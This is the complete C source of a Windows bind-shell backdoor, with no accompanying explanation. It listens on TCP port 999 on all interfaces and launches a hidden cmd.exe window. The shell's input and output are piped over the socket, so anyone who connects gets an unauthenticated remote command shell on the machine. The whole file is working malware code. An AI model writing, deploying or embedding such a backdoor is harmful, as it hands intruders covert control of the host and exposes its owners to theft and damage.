#pragma comment(lib, "ws2_32")
#include <winsock2.h>
#include <stdio.h>

int main(){
    WSADATA wsa;
    SOCKET listenFD, clientFD;
    char Buff[1024];
    int iAddrSize;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2,2), &wsa);
    listenFD = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_port = htons(999);
    server.sin_addr.s_addr = ADDR_ANY;
    bind(listenFD, (sockaddr *)&server, sizeof(server));
    listen(listenFD, 2);
    iAddrSize = sizeof(server);
    clientFD = accept(listenFD, (sockaddr*)&server, &iAddrSize);

    SECURITY_ATTRIBUTES sa;
    sa.nLength = 12;
    sa.lpSecurityDescriptor = 0;
    sa.bInheritHandle = true;

    HANDLE hReadPipe1, hReadPipe2, hWritePipe1, hWritePipe2;
    CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0);
    CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0);

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hReadPipe2;
    si.hStdOutput = si.hStdError = hWritePipe1;

    char cmdLine[] = "cmd.exe";
    PROCESS_INFORMATION ProcessInformation;
    CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);

    int ret;
    unsigned long lBytesRead;
    while(1){
        PeekNamedPipe(hReadPipe1, Buff, 1024, &lBytesRead, 0, 0);
        if(lBytesRead){
            ret = ReadFile(hReadPipe1, Buff, lBytesRead, &lBytesRead, 0);
            if(!ret) break;
            ret = send(clientFD, Buff, lBytesRead, 0);
            if(ret <= 0) break;
        }else{
            lBytesRead = recv(clientFD, Buff, 1024, 0);
            if(lBytesRead <= 0) break;
            ret = WriteFile(hWritePipe2, Buff, lBytesRead, &lBytesRead, 0);
            if(!ret) break;
        }
    }

    return 0;
}
